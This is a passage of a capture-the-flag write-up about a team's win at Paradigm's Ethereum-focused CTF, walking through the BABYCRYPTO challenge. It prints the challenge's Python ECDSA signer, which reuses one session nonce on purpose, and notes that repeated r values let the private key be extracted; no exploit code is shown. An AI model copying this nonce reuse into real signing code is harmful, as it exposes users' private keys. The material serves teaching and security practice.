+&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;&#x2F;h2&gt;
+&lt;p&gt;Paradigm, a crypto-focused investment firm, hosted a capture-the-flag style competition over the past weekend with over $10,000 in prizes split among the top three teams. Our team, dilicious&lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#1&quot;&gt;1&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt; &lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#2&quot;&gt;2&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt;, competed and took first place, solving 15 out of a possible 17 challenges.&lt;&#x2F;p&gt;
+&lt;p&gt;If you aren&#x27;t familiar with the term, a capture-the-flag competition (at least in the software industry) is a cyber-security challenge where participants exploit vulnerabilities to achieve goals (analogous to capturing the flag in meatspace.)&lt;&#x2F;p&gt;
+&lt;p&gt;This particular competition was focused on the Ethereum blockchain and related technologies.&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;our-team&quot;&gt;Our Team&lt;&#x2F;h3&gt;
+&lt;p&gt;Our team, in alphabetical order by the first letters of our Twitter usernames:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;adietrichs&quot;&gt;@adietrichs&lt;&#x2F;a&gt; &lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#3&quot;&gt;3&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;GNSPS&quot;&gt;@GNSPS&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;joranhonig&quot;&gt;@joranhonig&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;lethalspoons&quot;&gt;@lethalspoons&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;lightclients&quot;&gt;@lightclients&lt;&#x2F;a&gt; &lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#3&quot;&gt;3&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;sbetamc&quot;&gt;@sbetamc&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;_SamWilsn_&quot;&gt;@_SamWilsn_&lt;&#x2F;a&gt; &lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#3&quot;&gt;3&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;smarx&quot;&gt;@smarx&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;vwuestholz&quot;&gt;@vwuestholz&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;wadeAlexC&quot;&gt;@wadeAlexC&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;twitter.com&#x2F;wolflo0&quot;&gt;@wolflo0&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;Go follow them or something, I don&#x27;t know.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;challenges&quot;&gt;Challenges&lt;&#x2F;h2&gt;
+&lt;p&gt;The competition was split into 17 challenges, covering topics from reverse engineering, to cryptography, to market manipulation. Considering I&#x27;m an expert in exactly zero of those fields, I&#x27;m quite surprised I have anything to write up!&lt;&#x2F;p&gt;
+&lt;h3 id=&quot;babycrypto&quot;&gt;BABYCRYPTO&lt;&#x2F;h3&gt;
+&lt;p&gt;The first challenge I opened was BABYCRYPTO. Considering the name, it seemed like the second easiest challenge (after HELLO, which @adietrichs had already taken) and I figured if I was going to be able to contribute anything, it would be here.&lt;&#x2F;p&gt;
+&lt;p&gt;Clicking the challenge, I was greeted by a pleasantly green-and-black page:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;.&#x2F;babycrypto.png&quot; alt=&quot;I&#x27;ve written a super simple program to sign some data. Hopefully I didn&#x27;t mess anything up!&quot; &#x2F;&gt; &lt;em&gt;Top points to Paradigm for the hacker-esque vibe.&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Based on my minutes of experience in other software puzzle games, I suspected that this might be a XOR cypher or a Caesar square, so I quickly downloaded all three of the challenge zips, and spent the next half-an-hour or so setting up Docker and building images. The Dockerfiles in the archives turned out to be the biggest red herring of the entire weekend, tricking several of us into a bunch of work that was ultimately pointless. &lt;sup class=&quot;footnote-reference&quot;&gt;&lt;a href=&quot;#4&quot;&gt;4&lt;&#x2F;a&gt;&lt;&#x2F;sup&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;The contents of the three BABYCRYPTO archives:&lt;&#x2F;p&gt;
+&lt;pre&gt;&lt;font color=&quot;#3465A4&quot;&gt;&lt;b&gt;.&lt;&#x2F;b&gt;&lt;&#x2F;font&gt;
+├── &lt;font color=&quot;#3465A4&quot;&gt;&lt;b&gt;babycrypto&lt;&#x2F;b&gt;&lt;&#x2F;font&gt;
+│   └── &lt;font color=&quot;#3465A4&quot;&gt;&lt;b&gt;public&lt;&#x2F;b&gt;&lt;&#x2F;font&gt;
+│       ├── &lt;font color=&quot;#3465A4&quot;&gt;&lt;b&gt;deploy&lt;&#x2F;b&gt;&lt;&#x2F;font&gt;
+│       │   ├── chal.py
+│       │   └── requirements.txt
+│       └── Dockerfile
+├── &lt;font color=&quot;#3465A4&quot;&gt;&lt;b&gt;challenge_base&lt;&#x2F;b&gt;&lt;&#x2F;font&gt;
+│   ├── 00-create-xinetd-service
+│   ├── 99-start-xinetd
+│   ├── Dockerfile
+│   ├── &lt;font color=&quot;#4E9A06&quot;&gt;&lt;b&gt;entrypoint.sh&lt;&#x2F;b&gt;&lt;&#x2F;font&gt;
+│   └── &lt;font color=&quot;#4E9A06&quot;&gt;&lt;b&gt;handler.sh&lt;&#x2F;b&gt;&lt;&#x2F;font&gt;
+└── &lt;font color=&quot;#3465A4&quot;&gt;&lt;b&gt;eth_challenge_base&lt;&#x2F;b&gt;&lt;&#x2F;font&gt;
+    ├── 98-start-gunicorn
+    ├── Dockerfile
+    └── &lt;font color=&quot;#3465A4&quot;&gt;&lt;b&gt;eth_sandbox&lt;&#x2F;b&gt;&lt;&#x2F;font&gt;
+        ├── auth.py
+        ├── hashcash.py
+        ├── __init__.py
+        ├── launcher.py
+        └── server.py
+&lt;&#x2F;pre&gt;
+&lt;p&gt;The ~~only important~~ file I chose to focus on was &lt;code&gt;chal.py&lt;&#x2F;code&gt;, which ended up being a good place to start for most of the future challenges too.&lt;&#x2F;p&gt;
+&lt;p&gt;Here is &lt;code&gt;chal.py&lt;&#x2F;code&gt; in its entirety:&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#2b303b;&quot;&gt;
+&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;random &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;SystemRandom
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;ecdsa &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;ecdsa
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;sha3
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;binascii
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;typing &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;Tuple
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;uuid
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;os
+
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;gen_keypair&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;() -&amp;gt; Tuple[ecdsa.Private_key, ecdsa.Public_key]:
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
+    generate a new ecdsa keypair
+    &amp;quot;&amp;quot;&amp;quot;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;g = ecdsa.generator_secp256k1
+    d = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;SystemRandom&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;().&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;randrange&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;, g.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;order&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;())
+    pub = ecdsa.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Public_key&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(g, g * d)
+    priv = ecdsa.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Private_key&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(pub, d)
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;priv, pub
+
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;gen_session_secret&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;() -&amp;gt; int:
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
+    generate a random 32 byte session secret
+    &amp;quot;&amp;quot;&amp;quot;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;with &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;&#x2F;dev&#x2F;urandom&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;rb&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;rnd:
+        seed1 = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(binascii.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;hexlify&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(rnd.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;)), &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;)
+        seed2 = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(binascii.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;hexlify&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(rnd.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;32&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;)), &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;)
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;seed1 ^ seed2
+
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;hash_message&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;: str) -&amp;gt; int:
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
+    hash the message using keccak256, truncate if necessary
+    &amp;quot;&amp;quot;&amp;quot;
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;k = sha3.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;keccak_256&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;()
+    k.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;update&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(msg.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;))
+    d = k.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;digest&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;()
+    n = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(binascii.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;hexlify&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(d), &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;)
+    olen = ecdsa.generator_secp256k1.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;order&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;().&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;bit_length&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;() or &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;dlen = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(d)
+    n &amp;gt;&amp;gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;max&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;, dlen - olen)
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;n
+
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;__name__ == &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;:
+    flag = os.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;getenv&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;FLAG&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;, &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;PCTF&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;{placeholder}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;)
+
+    priv, pub = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;gen_keypair&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;()
+    session_secret = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;gen_session_secret&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;()
+
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;_ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;):
+        message = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;message? &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;)
+        hashed = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;hash_message&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(message)
+        sig = priv.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sign&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(hashed, session_secret)
+        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;r=0x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;{sig.r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;:032x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;}&amp;quot;)
+        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;s=0x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;{sig.s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;:032x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;}&amp;quot;)
+
+    test = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;hash_message&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(uuid.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;uuid4&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;().hex)
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;test=0x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;{test&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;:032x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;}&amp;quot;)
+
+    r = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;r? &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;), &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;)
+    s = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;s? &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;), &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;)
+
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;not pub.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;verifies&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(test, ecdsa.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Signature&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(r, s)):
+        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;better luck next time&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;&amp;quot;)
+        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;)
+
+    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span style=&quot;color:#c0c5ce;&quot;&gt;(flag)
+&lt;&#x2F;span&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;With the &lt;code&gt;requirements.txt&lt;&#x2F;code&gt; file, I was able to get the program to run locally:&lt;&#x2F;p&gt;
+&lt;pre&gt;
+message?
+&lt;&#x2F;pre&gt;
+&lt;p&gt;This is Python3, so that rules out any shenanigans with &lt;code&gt;input&lt;&#x2F;code&gt; vs. &lt;code&gt;raw_input&lt;&#x2F;code&gt;. I didn&#x27;t notice any other particularly interesting points in the code itself, so that means it must &lt;em&gt;actually be a cryptography challenge!&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;Oh god. Its ECDSA. I knew I should&#x27;ve paid more attention in my undergraduate cryptography class. I was about to ask @adietrichs if I could take a look at HELLO instead, when I noticed this interesting pattern:&lt;&#x2F;p&gt;
+&lt;pre&gt;
+message? wanna switch?
+&lt;font color=&quot;#3465A4&quot;&gt;r=0xe430b3a398f2320556eef81c1c523ea5ae0a920f493c8376eafcb0dc9cd75b89&lt;&#x2F;font&gt;
+s=0x4a19d0b156a9d10b0a86b729316909cdc8634ec23aa38f5f891e2599fc316a81
+message? no
+&lt;font color=&quot;#3465A4&quot;&gt;r=0xe430b3a398f2320556eef81c1c523ea5ae0a920f493c8376eafcb0dc9cd75b89&lt;&#x2F;font&gt;
+s=0x43d8ec82d7b6b1f3c8ed41b0ba682d5291f6d4a922a57729fa716dccd0f237d6
+message? &amp;lt;&#x2F;3
+&lt;font color=&quot;#3465A4&quot;&gt;r=0xe430b3a398f2320556eef81c1c523ea5ae0a920f493c8376eafcb0dc9cd75b89&lt;&#x2F;font&gt;
+s=0xbbfb7b34c31f025bddb8724a53dae7dd5a17c489587b881b8ed0dc5453c07e87
+&lt;&#x2F;pre&gt;
+&lt;p&gt;The &lt;code&gt;r&lt;&#x2F;code&gt; values for the three different messages were the same! As established earlier, I&#x27;m no cryptography expert, and I have no idea what &lt;code&gt;r&lt;&#x2F;code&gt; actually means, but I &lt;strong&gt;do&lt;&#x2F;strong&gt; know that you should get different outputs when signing different inputs, so off to search the internet!&lt;&#x2F;p&gt;
+&lt;video style=&quot;width: 100%&quot; src=&quot;.&#x2F;aha.mp4&quot; controls autoplay loop muted&gt;
+    &lt;p&gt;
+        Your browser doesn&#x27;t seem to support &lt;a href=&quot;.&#x2F;aha.mp4&quot;&gt;this video&lt;&#x2F;a&gt;.
+        You aren&#x27;t missing much. Just me searching the internet for what to do
+        with a repeated &lt;code&gt;r&lt;&#x2F;code&gt; value.
+    &lt;&#x2F;p&gt;
+&lt;&#x2F;video&gt;
+&lt;p&gt;Aha! We have our vulnerability. Repeating something about something lets you extract the private key.&lt;&#x2F;p&gt;
